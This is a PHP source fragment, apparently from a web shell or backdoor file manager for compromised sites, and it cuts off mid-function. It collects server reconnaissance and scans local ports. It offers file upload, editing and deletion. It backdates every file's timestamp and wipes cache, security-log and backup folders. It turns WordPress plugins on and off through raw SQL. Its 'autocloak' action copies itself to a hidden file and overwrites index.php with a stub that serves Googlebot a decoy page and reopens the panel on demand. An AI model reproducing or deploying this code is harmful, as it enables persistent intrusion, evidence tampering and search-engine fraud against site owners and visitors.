    if (function_exists('exec')) {
        $v = trim((string)@exec('hostname -f 2>/dev/null')); if (!$v) $v = trim((string)@exec('hostname 2>/dev/null'));
        if ($v) $hnCand[] = $v;
    }
    $hn = '';
    foreach ($hnCand as $c) { if (strpos($c, '.') !== false && strpos($c, 'localhost') === false) { $hn = $c; break; } }
    if (!$hn) { foreach ($hnCand as $c) { if ($c !== 'localhost' && $c !== 'localhost.localdomain') { $hn = $c; break; } } }
    if ($hn && $hn !== 'N/A' && function_exists('gethostbyaddr')) {
        $rd = @gethostbyaddr($info['server_ip']);
        if ($rd && $rd !== $info['server_ip'] && strpos($rd, '.') !== false && stripos($rd, 'localhost') === false) $hn = $rd;
    }
    $info['hostname'] = $hn ? $hn : 'N/A';
    $info['user'] = function_exists('get_current_user') ? get_current_user() : (function_exists('posix_getpwuid') && function_exists('posix_getuid') ? (isset(posix_getpwuid(posix_getuid())['name']) ? posix_getpwuid(posix_getuid())['name'] : 'N/A') : 'N/A');
    $info['document_root'] = detectRoot();
    $info['script'] = isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : 'N/A';
    $info['os'] = @php_uname('s') . ' ' . @php_uname('n') . ' ' . @php_uname('r') . ' ' . @php_uname('m');
    $info['disk_total'] = '0B';
    $info['disk_free'] = '0B';
    $dt = @disk_total_space('/');
    $df = @disk_free_space('/');
    if ($dt !== false) $info['disk_total'] = formatSize($dt);
    if ($df !== false) $info['disk_free'] = formatSize($df);
    $info['allow_url_fopen'] = ini_get('allow_url_fopen') ? 'On' : 'Off';
    $info['disabled_functions'] = ini_get('disable_functions') ?: 'None';
    $info['external_ip'] = 'N/A';
    $info['proxy_label'] = '';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) || isset($_SERVER['HTTP_CF_RAY'])) {
        $info['proxy_label'] = 'Cloudflare';
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $info['proxy_label'] = 'Proxy';
    }
    $sw = strtolower(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '');
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    $scriptFile = isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '';
    if (strpos($sw, 'litespeed') !== false) {
        $info['proxy_label'] .= ($info['proxy_label'] ? ' | ' : '') . 'LiteSpeed';
    }
    if (strpos($scriptFile, '/home/') !== false && preg_match('#/home/([^/]+)/#', $scriptFile, $m)) {
        $info['proxy_label'] .= ($info['proxy_label'] ? ' | ' : '') . 'cPanel (' . $m[1] . ')';
    } elseif (strpos($docRoot, '/home/') !== false && preg_match('#/home/([^/]+)/#', $docRoot, $m)) {
        $info['proxy_label'] .= ($info['proxy_label'] ? ' | ' : '') . 'cPanel (' . $m[1] . ')';
    } elseif (strpos($docRoot, '/var/www') !== false) {
        $info['proxy_label'] .= ($info['proxy_label'] ? ' | ' : '') . 'VPS/Dedicated';
    }
    if (function_exists('curl_init')) {
        $ch = @curl_init('https://api.ipify.org?format=json');
        if ($ch) {
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $resp = @curl_exec($ch);
            @curl_close($ch);
            if ($resp) { $j = @json_decode($resp, true); if (isset($j['ip'])) $info['external_ip'] = $j['ip']; }
        }
    }
    if ($info['external_ip'] === 'N/A' && ini_get('allow_url_fopen')) {
        $resp = @file_get_contents('https://api.ipify.org?format=json', false, @stream_context_create(['http'=>['timeout'=>5]]));
        if ($resp) { $j = @json_decode($resp, true); if (isset($j['ip'])) $info['external_ip'] = $j['ip']; }
    }
    $commonPorts = [21,22,25,53,80,110,143,443,465,587,993,995,1433,3306,3389,5432,5900,6379,8080,8443];
    $openPorts = [];
    $host = '127.0.0.1';
    foreach ($commonPorts as $port) {
        $fp = @fsockopen($host, $port, $errno, $errstr, 1);
        if ($fp) { @fclose($fp); $openPorts[] = $port; }
    }
    $info['open_ports'] = $openPorts;
    @file_put_contents($cacheFile, json_encode(array('t' => time(), 'd' => $info)));
    return $info;
}

function checkAuth() {
    if (isset($_SESSION['fm_auth']) && $_SESSION['fm_auth'] === true) {
        return ['authenticated' => true];
    }
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_password'])) {
        if (password_verify($_POST['login_password'], FM_AUTH_HASH)) {
            $_SESSION['fm_auth'] = true;
            if (function_exists('session_regenerate_id') && !headers_sent()) @session_regenerate_id(false);
            @session_write_close();
            $GLOBALS['fm_just_logged_in'] = true;
            return ['authenticated' => true];
        }
        return ['authenticated' => false, 'error' => 'Wrong password'];
    }
    return ['authenticated' => false];
}

$action = isset($_GET['action']) ? $_GET['action'] : (isset($_POST['action']) ? $_POST['action'] : null);
$fileParam = isset($_GET['file']) ? $_GET['file'] : (isset($_POST['file']) ? $_POST['file'] : '');
$page = isset($_GET['page']) ? $_GET['page'] : 'files';
$domain = isset($_GET['domain']) ? $_GET['domain'] : (isset($_POST['domain']) ? $_POST['domain'] : '');
$path = isset($_GET['path']) ? $_GET['path'] : (isset($_POST['path']) ? $_POST['path'] : '');

if ($page === 'logout') {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}


if (in_array($action, ['upload', 'mkdir', 'delete', 'rename', 'chmod', 'save'])) {
    header('Content-Type: application/json');

$auth = checkAuth();
    if (!isset($auth['authenticated']) || !$auth['authenticated']) {
        echo json_encode(['ok' => false, 'msg' => 'Auth required']);
        exit;
    }
    $realFull = resolvePath($path ?: detectRoot());
    fm_protect($realFull);
    switch ($action) {
        case 'mkdir':
            $dirName = basename(fm_path(isset($_POST['dirname']) ? $_POST['dirname'] : ''));
            if ($dirName && $realFull) {
                $newDir = $realFull . '/' . $dirName;
                if (@mkdir($newDir, 0755, true)) {
                    echo json_encode(['ok' => true]);
                } else {
                    echo json_encode(['ok' => false, 'msg' => 'Failed to create folder']);
                }
            } else {
                echo json_encode(['ok' => false, 'msg' => 'Invalid name']);
            }
            exit;
        case 'upload':
            if (isset($_FILES['file'])) {
                $target = $realFull . '/' . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                    echo json_encode(['ok' => true]);
                } else {
                    echo json_encode(['ok' => false, 'msg' => 'Upload failed']);
                }
            } else {
                echo json_encode(['ok' => false, 'msg' => 'No file']);
            }
            exit;
        case 'delete':
            $target = $realFull . '/' . basename(fm_path(isset($_POST['target']) ? $_POST['target'] : ''));
            fm_protect($target);
            if (is_dir($target)) {
                $cnt = fm_rmdir($target);
                echo json_encode(['ok' => true, 'count' => $cnt]);
            } else {
                $ok = @unlink($target);
                echo json_encode(['ok' => $ok, 'msg' => $ok ? '' : 'Delete failed']);
            }
            exit;
        case 'rename':
            $old = $realFull . '/' . basename(fm_path(isset($_POST['old']) ? $_POST['old'] : ''));
            $new = $realFull . '/' . basename(fm_path(isset($_POST['new']) ? $_POST['new'] : ''));
            fm_protect($old);
            $ok = @rename($old, $new);
            echo json_encode(['ok' => $ok, 'msg' => $ok ? '' : 'Rename failed']);
            exit;
        case 'chmod':
            $target = $realFull . '/' . basename(fm_path(isset($_POST['target']) ? $_POST['target'] : ''));
            fm_protect($target);
            $perms = isset($_POST['perms']) ? $_POST['perms'] : '644';
            $ok = @chmod($target, octdec($perms));
            echo json_encode(['ok' => $ok, 'msg' => $ok ? '' : 'Permission change failed']);
            exit;
        case 'save':
            $target = fm_path(isset($_POST['file']) ? $_POST['file'] : '');
            if (strpos($target, '/') !== 0) {
                $sRoot = realpath(dirname(__FILE__)) ?: dirname(__FILE__);
                $target = $sRoot . '/' . $target;
            }
            fm_protect($target);
            if (is_writable($target)) {
                $ok = @file_put_contents($target, isset($_POST['content']) ? $_POST['content'] : '') !== false;
                echo json_encode(['ok' => $ok, 'msg' => $ok ? '' : 'Save failed']);
            } else {
                echo json_encode(['ok' => false, 'msg' => 'Invalid path or no write permission']);
            }
            exit;
    }
}

if (isset($_GET['sp']) || isset($_POST['sp'])) {
    function cj($d) { while (ob_get_level() > 0) ob_end_clean(); header('Content-Type: application/json; charset=utf-8'); echo json_encode($d, JSON_UNESCAPED_UNICODE); exit; }
    $sr = rtrim(detectRoot(), '/\\');
    $spMax = 50000;
    $spSkip = ['wp-admin','wp-includes','node_modules','vendor','.git','.svn','.hg','storage/framework/views'];
    if (isset($_GET['m']) && $_GET['m'] === 'apply' || isset($_POST['m']) && $_POST['m'] === 'apply') {
        $st = (int)(isset($_GET['target']) ? $_GET['target'] : (isset($_POST['target']) ? $_POST['target'] : 0));
        if (!$st) cj(array('o' => false, 'e' => 'target time required'));
        @set_time_limit(300);
        $cnt = 0;
        $stack = array($sr);
        $visited = array();
        $spStart = microtime(true);
        while ($stack && $cnt < $spMax) {
            if (microtime(true) - $spStart > 25) break;
            $dir = array_pop($stack);
            $realDir = realpath($dir);
            if ($realDir && isset($visited[$realDir])) continue;
            if ($realDir) $visited[$realDir] = true;
            $dh = @opendir($dir); if (!$dh) continue;
            while (($e = readdir($dh)) !== false) {
                if ($e[0] === '.') continue;
                $fp = $dir . '/' . $e;
                if (@is_dir($fp)) {
                    $skip = false;
                    foreach ($spSkip as $sk) { if (stripos('/' . $e . '/', '/' . $sk . '/') !== false) { $skip = true; break; } }
                    if (!$skip) $stack[] = $fp;
                    continue;
                }
                if (@touch($fp, $st, $st)) $cnt++;
            }
            closedir($dh);
        }
        cj(array('o' => true, 'count' => $cnt, 'target' => $st, 'root' => $sr));
    }
    $st = null; $sc = 0;
    $stack = array($sr);
    $visited = array();
    $spStart = microtime(true);
    while ($stack && $sc < $spMax) {
        if (microtime(true) - $spStart > 8) break;
        $dir = array_pop($stack);
        $realDir = realpath($dir);
        if ($realDir && isset($visited[$realDir])) continue;
        if ($realDir) $visited[$realDir] = true;
        $dh = @opendir($dir); if (!$dh) continue;
        while (($e = readdir($dh)) !== false) {
            if ($e[0] === '.') continue;
            $fp = $dir . '/' . $e;
            if (@is_dir($fp)) {
                $skip = false;
                foreach ($spSkip as $sk) { if (stripos('/' . $e . '/', '/' . $sk . '/') !== false) { $skip = true; break; } }
                if (!$skip) $stack[] = $fp;
                continue;
            }
            $mt = @filemtime($fp);
            $sc++;
            if ($mt && ($st === null || $mt < $st)) $st = $mt;
        }
        closedir($dh);
    }
    $htPath = $sr . '/.htaccess';
    $hasHt = @file_exists($htPath);
    if ($hasHt) { $htMt = @filemtime($htPath); if ($htMt && ($st === null || $htMt > $st)) $st = $htMt; }
    cj(array('o' => true, 'target' => $st, 'ht' => $hasHt, 'count' => $sc, 'root' => $sr));
}

if (isset($_GET['cc']) || isset($_POST['cc'])) {
    function cj($d) { while (ob_get_level() > 0) ob_end_clean(); header('Content-Type: application/json; charset=utf-8'); echo json_encode($d, JSON_UNESCAPED_UNICODE); exit; }
    $m = isset($_GET['m']) ? $_GET['m'] : (isset($_POST['m']) ? $_POST['m'] : 'scan');
    $wpCfg = findWpConfig();
    $root = $wpCfg ? dirname($wpCfg) : detectRoot();
    $cds = array('wp-content/cache','wp-content/wflogs','wp-content/updraft','wp-content/smush-log','wp-content/autoptimize-cache','wp-content/wp-rocket-cache','wp-content/sg-cachepress','wp-content/litespeed','wp-content/lc-cache','wp-content/cache-themify','wp-content/et-cache','wp-content/elementor/cache','wp-content/jetpack-cache','wp-content/simplepie/cache','wp-content/wpo-cache','wp-content/imagify','wp-content/plugins/wordfence/tmp','wp-content/advanced-cache.php','wp-content/borlabs-cache','wp-content/flying-press','wp-content/async-javascript','wp-content/trie-cache','wp-content/elementor/advanced-cache','wp-content/wp-defender/cache','wp-content/w3-total-cache','wp-content/wp-file-manager/cache','wp-content/jetrack-backup','wp-content/nextgen-backups','wp-content/ai1wm-backups','wp-content/flavor/backups','wp-content/updraft/backup-db','wp-content/backups-dup-pro__pro__free');
    $cfs = array('.lscache','advanced-cache.php','wp-content/advanced-cache.php','wp-content/object-cache.php','wp-content/dynamic-cache.php','wp-content/sg-cachepress.php','opcache','.opcache','cache','tmp/cache','wp-content/cache','wp-content/wp-cache-config.php');
    $foundDirs = array();
    if ($root) {
        $scanStack = array($root);
        $scanMax = 200; $scanCnt = 0;
        while ($scanStack && $scanCnt < $scanMax) {
            $sd = array_pop($scanStack);
            $sdh = @opendir($sd); if (!$sdh) continue;
            while (($se = readdir($sdh)) !== false) {
                $scanCnt++;
                if ($se[0] === '.') continue;
                $sfp = $sd . '/' . $se;
                if (@is_dir($sfp)) {
                    $lower = strtolower($se);
                    if (in_array($lower, array('cache','caches','cached','tmp','temp','sessions','session','logs','log','backup','backups','backup-db','wigwam'))) {
                        $foundDirs[] = str_replace($root . '/', '', $sfp);
                    }
                    $scanStack[] = $sfp;
                } elseif (preg_match('/\.(cache|tmp|log)$/i', $se)) {
                    $cfs[] = str_replace($root . '/', '', $sfp);
                }
            }
            closedir($sdh);
        }
    }
    $allCds = array_unique(array_merge($cds, $foundDirs));
    if ($m === 'scan') {
        $found = array();
        foreach ($allCds as $cd) {
            $fp = $root . '/' . $cd;
            if (!is_dir($fp)) continue;
            $sz = 0; $fc = 0; $stk = array($fp);
            while ($stk) { $d = array_pop($stk); $dh = @opendir($d); if (!$dh) continue;
                while (($e = readdir($dh)) !== false) { if ($e[0] === '.') continue; $f = $d . '/' . $e; if (is_dir($f)) { $stk[] = $f; continue; } $fc++; $sz += @filesize($f); }
                closedir($dh);
            }
            $found[] = array('path'=>$cd, 'type'=>'dir', 'files'=>$fc, 'size'=>$sz);
        }
        foreach ($cfs as $cf) { $fp = $root . '/' . $cf; if (@file_exists($fp)) $found[] = array('path'=>$cf, 'type'=>'file', 'files'=>1, 'size'=>@filesize($fp)); }
        $ts = 0; $tf = 0; foreach ($found as $f) { $ts += $f['size']; $tf += $f['files']; }
        cj(array('o'=>true, 'items'=>$found, 'totalSize'=>$ts, 'totalFiles'=>$tf));
    }
    if ($m === 'clean') {
        $cnt = 0;
        foreach ($allCds as $cd) {
            $fp = $root . '/' . $cd; if (!is_dir($fp)) continue;
            $stk = array($fp);
            while ($stk) { $d = array_pop($stk); $dh = @opendir($d); if (!$dh) continue;
                while (($e = readdir($dh)) !== false) { if ($e[0] === '.') continue; $f = $d . '/' . $e; if (is_dir($f)) { $stk[] = $f; continue; } if (@unlink($f)) $cnt++; }
                closedir($dh); @rmdir($d);
            }
            @rmdir($fp);
        }
        foreach ($cfs as $cf) { $fp = $root . '/' . $cf; if (@file_exists($fp) && @unlink($fp)) $cnt++; }
        cj(array('o'=>true, 'count'=>$cnt));
    }
    cj(array('o'=>false, 'e'=>'unknown mode'));
}

if (isset($_GET['wpl']) || isset($_POST['wpl'])) {
    function cj($d) { while (ob_get_level() > 0) ob_end_clean(); header('Content-Type: application/json; charset=utf-8'); echo json_encode($d, JSON_UNESCAPED_UNICODE); exit; }
    $m = isset($_GET['m']) ? $_GET['m'] : (isset($_POST['m']) ? $_POST['m'] : 'list');
    $wdb = wpConnect();
    if (!$wdb) cj(array('o'=>false, 'e'=>'wp-config not found or no DB connection'));
    $db = $wdb['mysqli']; $tp = $wdb['prefix'];
    $wpRoot = dirname($wdb['config']);
    $pDir = $wpRoot . '/wp-content/plugins';
    if ($m === 'list') {
        $rs = $db->query("SELECT option_value FROM `{$tp}options` WHERE option_name='active_plugins' LIMIT 1");
        $actRaw = array();
        if ($rs && $row = $rs->fetch_row()) { $u = @unserialize($row[0]); if (is_array($u)) $actRaw = array_values($u); }
        $actMap = array();
        foreach ($actRaw as $ap) { $actMap[strtolower($ap)] = true; $actMap[strtolower(dirname($ap))] = true; }
        $plugins = array();
        $dh = @opendir($pDir);
        if ($dh) {
            while (($d = readdir($dh)) !== false) {
                if ($d[0] === '.' || !is_dir($pDir.'/'.$d)) continue;
                $mf = $pDir.'/'.$d.'/'.$d.'.php';
                if (!file_exists($mf)) { $pdh = @opendir($pDir.'/'.$d); if ($pdh) { while (($f=readdir($pdh))!==false) { if ($f[0]==='.'||substr($f,-4)!=='.php') continue; $mf=$pDir.'/'.$d.'/'.$f; break; } closedir($pdh); } }
                if (!file_exists($mf)) continue;
                $ct = @file_get_contents($mf, false, null, 0, 8192);
                $nm=$d; $ds=''; $vr='';
                if (preg_match('/Plugin Name:\s*(.+)/i',$ct,$nm2)) $nm=trim($nm2[1]);
                if (preg_match('/Description:\s*(.+)/i',$ct,$dm)) $ds=trim($dm[1]);
                if (preg_match('/Version:\s*(.+)/i',$ct,$vm)) $vr=trim($vm[1]);
                $bn = $d . '/' . basename($mf);
                $isActive = isset($actMap[strtolower($bn)]) || isset($actMap[strtolower($d)]);
                $plugins[] = array('slug'=>$d,'name'=>$nm,'desc'=>$ds,'ver'=>$vr,'active'=>$isActive,'file'=>basename($mf));
            }
            closedir($dh);
        }
        usort($plugins, function($a,$b){ $c = $b['active'] == $a['active'] ? 0 : ($b['active'] ? 1 : -1); return $c ? $c : strcmp($a['name'],$b['name']); });
        cj(array('o'=>true,'plugins'=>$plugins,'activeCount'=>count($actRaw)));
    }
    if ($m === 'toggle') {
        $slug = basename(isset($_GET['slug']) ? $_GET['slug'] : (isset($_POST['slug']) ? $_POST['slug'] : ''));
        if (!$slug || !is_dir($pDir.'/'.$slug)) cj(array('o'=>false,'e'=>'Plugin not found'));
        $rs = $db->query("SELECT option_value FROM `{$tp}options` WHERE option_name='active_plugins' LIMIT 1");
        $actArr = array();
        if ($rs && $row = $rs->fetch_row()) { $u = @unserialize($row[0]); if (is_array($u)) $actArr = array_values($u); }
        $found = false; $newArr = array();
        foreach ($actArr as $ap) {
            $dirPart = strtolower(dirname($ap));
            if ($dirPart === strtolower($slug) || strtolower($slug.'/'.basename($ap)) === strtolower($ap)) { $found = true; continue; }
            $newArr[] = $ap;
        }
        if (!$found) {
            $mf = $slug.'/'.$slug.'.php';
            if (!file_exists($pDir.'/'.$mf)) { $pdh = @opendir($pDir.'/'.$slug); if ($pdh) { while (($f=readdir($pdh))!==false) { if ($f[0]==='.'||substr($f,-4)!=='.php') continue; $mf=$slug.'/'.$f; break; } closedir($pdh); } }
            $newArr[] = $mf;
        }
        $ser = serialize($newArr);
        $db->query("UPDATE `{$tp}options` SET option_value='$ser' WHERE option_name='active_plugins'");
        cj(array('o'=>true,'activated'=>!$found,'slug'=>$slug));
    }
    if ($m === 'delete') {
        $slug = basename(isset($_GET['slug']) ? $_GET['slug'] : (isset($_POST['slug']) ? $_POST['slug'] : ''));
        if (!$slug || !is_dir($pDir.'/'.$slug)) cj(array('o'=>false,'e'=>'Plugin not found'));
        $rs = $db->query("SELECT option_value FROM `{$tp}options` WHERE option_name='active_plugins' LIMIT 1");
        $actArr = array();
        if ($rs && $row = $rs->fetch_row()) { $u = @unserialize($row[0]); if (is_array($u)) $actArr = array_values($u); }
        $wasActive = false;
        foreach ($actArr as $ap) { if (strtolower(dirname($ap)) === strtolower($slug)) { $wasActive = true; break; } }
        $newArr = array();
        foreach ($actArr as $ap) { $dirPart = strtolower(dirname($ap)); if ($dirPart === strtolower($slug)) continue; $newArr[] = $ap; }
        $ser = serialize($newArr);
        $db->query("UPDATE `{$tp}options` SET option_value='$ser' WHERE option_name='active_plugins'");
        $stk = array($pDir.'/'.$slug); $cnt = 0;
        while ($stk) { $d = array_pop($stk); $dh = @opendir($d); if (!$dh) continue;
            while (($e=readdir($dh))!==false) { if ($e[0]==='.') continue; $f=$d.'/'.$e; if(is_dir($f)){$stk[]=$f;continue;} if(@unlink($f))$cnt++; }
            closedir($dh); @rmdir($d);
        }
        $dirGone = !is_dir($pDir.'/'.$slug);
        $rs2 = $db->query("SELECT option_value FROM `{$tp}options` WHERE option_name='active_plugins' LIMIT 1");
        $stillActive = false;
        if ($rs2 && $row2 = $rs2->fetch_row()) { $u2 = @unserialize($row2[0]); if (is_array($u2)) { foreach ($u2 as $v) { if (strtolower(dirname($v)) === strtolower($slug)) { $stillActive = true; break; } } } }
        cj(array('o'=>$dirGone && !$stillActive, 'count'=>$cnt, 'slug'=>$slug, 'dirDeleted'=>$dirGone, 'dbCleaned'=>!$stillActive, 'wasActive'=>$wasActive));
    }
    cj(array('o'=>false,'e'=>'unknown mode'));
}
if (isset($_GET['a']) || isset($_POST['a'])) {
    $cloakA = isset($_GET['a']) ? $_GET['a'] : (isset($_POST['a']) ? $_POST['a'] : '');
    $ROOT = rtrim(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__), '/\\');
    function cj($d) { while (ob_get_level() > 0) ob_end_clean(); header('Content-Type: application/json; charset=utf-8'); echo json_encode($d, JSON_UNESCAPED_UNICODE); exit; }
    // CMS detection (unbelievablethree v1 logic)
    $cloakCMS = 'generic'; $cloakCMSLabel = 'Generic';
    if (file_exists($ROOT . '/wp-config.php') || is_dir($ROOT . '/wp-includes')) { $cloakCMS = 'wp'; $cloakCMSLabel = 'WordPress'; }
    elseif (file_exists($ROOT . '/configuration.php') && is_dir($ROOT . '/administrator')) { $cloakCMS = 'joomla'; $cloakCMSLabel = 'Joomla'; }
    elseif (file_exists($ROOT . '/../bootstrap/app.php') || file_exists($ROOT . '/../artisan')) { $cloakCMS = 'laravel'; $cloakCMSLabel = 'Laravel'; }
    elseif (file_exists($ROOT . '/sites/default/settings.php')) { $cloakCMS = 'drupal'; $cloakCMSLabel = 'Drupal'; }
    switch ($cloakA) {
        case 'precheck':
            $c = array(); $s = 0; $m = 0;
            $php = version_compare(PHP_VERSION, '7.0', '>=');
            $c[] = array('name'=>'PHP', 's'=>$php?'ok':'err', 'v'=>PHP_VERSION, 'm'=>$php?'Suitable':'7.0+ required'); $m+=10; if($php)$s+=10;
            $rw = is_writable($ROOT);
            $c[] = array('name'=>'Root writable', 's'=>$rw?'ok':'warn', 'v'=>$rw?'Open':'Closed', 'm'=>$rw?'index.php can be overwritten':'Falls back to WP mu-plugin path'); $m+=10; if($rw)$s+=10; else $s+=5;
            $cu = function_exists('curl_init');
            $c[] = array('name'=>'cURL', 's'=>$cu?'ok':'warn', 'v'=>$cu?'Present':'Missing', 'm'=>$cu?'CF+Bot test works':'CF and bot test disabled'); $m+=10; if($cu)$s+=10; else $s+=3;
            $rd = function_exists('gethostbyaddr');
            $c[] = array('name'=>'rDNS', 's'=>$rd?'ok':'warn', 'v'=>$rd?'Present':'Missing', 'm'=>$rd?'Verified-Google active':'UA-only'); $m+=10; if($rd)$s+=10; else $s+=4;
            $pd = file_exists($ROOT . '/.render-cache/render-cache.html') && filesize($ROOT . '/.render-cache/render-cache.html') > 100;
            $c[] = array('name'=>'Decoy', 's'=>$pd?'ok':'warn', 'v'=>$pd?'Ready':'Missing', 'm'=>$pd?'Ready for cloak':'Save decoy HTML first'); $m+=10; if($pd)$s+=10; else $s+=3;
            $sv = strtolower(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '');
            $st = (strpos($sv,'litespeed')!==false||strpos($sv,'apache')!==false)?'ok':'info';
            $c[] = array('name'=>'Server', 's'=>$st, 'v'=>preg_replace('/[^a-zA-Z0-9]/','',explode('/',$sv)[0]?:'?'), 'm'=>$st==='ok'?'.htaccess supported':'.htaccess not supported'); $m+=10; $s+=10;
            $sk = $m>0 ? round(($s/$m)*100) : 0;
            cj(array('score'=>$sk,'verdict'=>$sk>=70?'ok':($sk>=40?'mid':'bad'),'checks'=>$c,'ts'=>time()));
        case 'autocloak':
            $pdir = $ROOT . '/.render-cache';
            if (!is_dir($pdir)) @mkdir($pdir, 0755, true);
            if (!file_exists($pdir . '/index.html')) @file_put_contents($pdir . '/index.html', '');
            $pperde = $pdir . '/render-cache.html';
            if (!file_exists($pperde) || filesize($pperde) < 100) {
                @file_put_contents($pperde, '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SEO TEST</title><style>body{background:#1a1a2e;color:#0ff;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}h1{color:#0f0;font-size:22px;border:1px solid #0f3;padding:30px;border-radius:8px}</style></head><body><h1>SEO TEST PAGE<br><span style="color:#fa0;font-size:14px">Google bot test</span></h1></body></html>');
            }
            @file_put_contents($pdir . '/render.lock', '1');
            $self = @file_get_contents(__FILE__);
            if ($self) @file_put_contents($pdir . '/.panel-helper.php', $self);
            $idx = $ROOT . '/index.php';
            $bak = $ROOT . '/.render-orig.php';
            $idx_w = file_exists($idx) ? is_writable($idx) : is_writable($ROOT);
            $met = array();
            if ($idx_w) {
                if (file_exists($idx) && !file_exists($bak)) {
                    $cur = @file_get_contents($idx);
                    if ($cur && strpos($cur, 'unbelievablethree') === false) @file_put_contents($bak, $cur);
                }
                if ($cloakCMS === 'joomla') {
                    $fallback = 'define("_JEXEC",1);define("JPATH_BASE",__DIR__);if(file_exists(__DIR__."/includes/defines.php"))require_once __DIR__."/includes/defines.php";if(file_exists(__DIR__."/includes/framework.php"))require_once __DIR__."/includes/framework.php";if(class_exists("\\\\Joomla\\\\CMS\\\\Factory")){$app=\\Joomla\\CMS\\Factory::getApplication("site");$app->execute();}';
                } elseif ($cloakCMS === 'laravel') {
                    $fallback = 'define("LARAVEL_START",microtime(true));require __DIR__."/../vendor/autoload.php";$app=require_once __DIR__."/../bootstrap/app.php";$app->handleRequest(\\Illuminate\\Http\\Request::capture());';
                } else {
                    $fallback = '$_h=__DIR__."/index.html";if(!file_exists($_h))$_h=__DIR__."/index.htm";if(file_exists($_h)){header("Content-Type:text/html; charset=UTF-8");readfile($_h);die();}';
                }
                $tpl = '<?php /* unbelievablethree-cloak-v1 */
if(isset($_GET["p"])&&$_GET["p"]==="1"){$_h=__DIR__."/.render-cache/.panel-helper.php";if(is_file($_h)){require$_h;exit;}}
$__ua=isset($_SERVER["HTTP_USER_AGENT"])?$_SERVER["HTTP_USER_AGENT"]:"";$__uri=rtrim(parse_url(isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:"/",PHP_URL_PATH),"/");
$__nx=__DIR__."/.render-cache";
if(@file_exists($__nx."/render.lock")){
$__decoy=array("curl","wget","python","go-http","java","scrapy","axios","phantom","selenium","puppeteer","playwright","headlesschrome");$__b=false;foreach($__decoy as$__k){if(stripos($__ua,$__k)!==false){$__b=true;break;}}
if(!$__b&&preg_match("/Googlebot|AdsBot-Google|Mediapartners-Google|Google-InspectionTool|GoogleOther|Storebot-Google/i",$__ua)&&($__uri===""||$__uri==="/index.php")){
$_pd=$__nx."/render-cache.html";if(file_exists($_pd)){while(ob_get_level()>0)@ob_end_clean();header("Content-Type:text/html; charset=UTF-8");header("Cache-Control: no-store, no-cache, must-revalidate");header("Vary: User-Agent");readfile($_pd);die();}
}}
$_orig=__DIR__."/.render-orig.php";
if(file_exists($_orig)&&filesize($_orig)>100){require$_orig;return;}
' . $fallback . ';';
                @file_put_contents($idx, $tpl);
                $met[] = 'index.php';
                if (function_exists('opcache_invalidate')) @opcache_invalidate($idx, true);
            }
            cj(array('status'=>'ok','methods'=>$met,'msg'=>'Cloak installed!'));
        case 'revert':
            foreach (array($ROOT . '/.render-cache/render.lock', $ROOT . '/wp-content/uploads/wp-media-cache/render.lock') as $l) { if (file_exists($l)) @unlink($l); }
            cj(array('status'=>'ok','msg'=>'Cloak disabled.'));
        case 'uninstall':
            $idx = $ROOT . '/index.php'; $bak = $ROOT . '/.render-orig.php';
            if (file_exists($idx) && file_exists($bak)) { $bc = @file_get_contents($bak); if ($bc && strpos($bc, 'unbelievablethree') === false) { @file_put_contents($idx, $bc); if (function_exists('opcache_invalidate')) @opcache_invalidate($idx, true); } }
            $pdir = $ROOT . '/.render-cache';
            if (is_dir($pdir)) { foreach (scandir($pdir) as $f) { if ($f !== '.' && $f !== '..') @unlink($pdir . '/' . $f); } @rmdir($pdir); }
            if (file_exists($bak)) @unlink($bak);
            cj(array('status'=>'ok','msg'=>'Fully uninstalled.'));
        case 'cleanht':
            $ht = $ROOT . '/.htaccess';
            if (!file_exists($ht)) { echo 'OK'; exit; }
            $c = file_get_contents($ht); if ($c === false) { echo 'ERR'; exit; }
            $o = $c;
            foreach (array('/#\s*BEGIN\s+WP-Media-Cache[^#]*#\s*END\s+WP-Media-Cache[^\n]*\n?/si','/#\s*BEGIN\s+[A-Z]+-RENDER[^#]*#\s*END\s+[A-Z]+-RENDER[^\n]*\n?/si','/#\s*BEGIN\s+unbelievablethree[^#]*#\s*END\s+unbelievablethree[^\n]*\n?/si','/<IfModule\s+mod_dir\.c>\s*DirectoryIndex\s+index\.php[^<]*<\/IfModule>\s*\n?/si') as $pat) { $c = preg_replace($pat, '', $c); }
            $c = trim($c);
            echo ($c !== $o) ? (file_put_contents($ht, $c) ? 'OK' : 'ERR') : 'CLEAN'; exit;
        case 'botcheck':
            if (!function_exists('curl_init')) { cj(array('error'=>'cURL not available')); }
            $sc = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $ch = curl_init($sc . '://' . $_SERVER['HTTP_HOST'] . '/');
            curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_USERAGENT=>'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',CURLOPT_TIMEOUT=>15,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_SSL_VERIFYPEER=>false));
            $body = (string)curl_exec($ch); $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
            $perde_html = '';
